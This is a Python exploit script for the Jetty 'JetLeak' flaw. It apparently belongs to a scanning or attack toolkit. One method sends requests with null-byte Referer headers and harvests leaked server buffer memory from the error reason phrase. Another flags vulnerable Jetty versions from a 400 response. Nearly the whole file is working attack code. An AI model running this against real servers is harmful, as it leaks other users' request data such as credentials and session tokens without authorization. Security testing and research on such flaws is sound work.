import requests
from urllib.parse import quote
import re,time

class Exploit:

    def __init__Attack1(self):
        pass


    def exp1(self, url):
        data = ''
        iter = 1
        step = 16
        data_re = re.compile(r'>>>(.*)\.\.\.')
        wait_time = 0
        wait_int = 5
        max_wait = 120
        while (len(data) <= 1000) and (wait_time < max_wait):
            headers = {"Referer": chr(0) * iter}

            try:
                resp = requests.get(url, headers=headers)

            except Exception as e:
                #print('Could not connect to server: {0}.'.format(e))
                wait_time = max_wait + 1
                break

            m = data_re.search(resp.reason)
            if m is not None:
                # If we have a match replace escaped unprintable characters with the
                # appropriate unprintable character. This prevents our byte count from
                # getting thrown off by the extra backslash character in the output.
                chunk = m.group(1)
                chunk = chunk.replace('\\r', '\r')
                chunk = chunk.replace('\\n', '\n')
                chunk = chunk.replace('\\x00', '\x00')
                step = len(chunk)

                # Don't store null bytes in our string.
                chunk = chunk.replace('\x00', '')

                # If the line is empty then wait five seconds to allow more data to be
                # put in the buffer.
                if chunk.strip('\r\n') == '':
                    wait_time += wait_int
                    time.sleep(wait_int)
                else:
                    data += chunk

            else:
                wait_time = max_wait + 1

            iter += step

        # Print our final set of leaked data.
        if data != '':
            return 'The following data was leaked:\n{0}'.format(data)

    def exp2(self, url):
        x = "\x00"
        headers = {"Referer": x}
        r1 = requests.post(url, headers = headers)

        if (r1.status_code == 400 and ("Illegal character 0x0 in state" in r1.content)):
            return "\r\nThis version of Jetty is VULNERABLE to JetLeak!"




    def attack(self, url):

        list = [self.exp1(url), self.exp2(url)]
        if list[0]: return list[0]
        elif list[1]: return list[1]
        else: return None
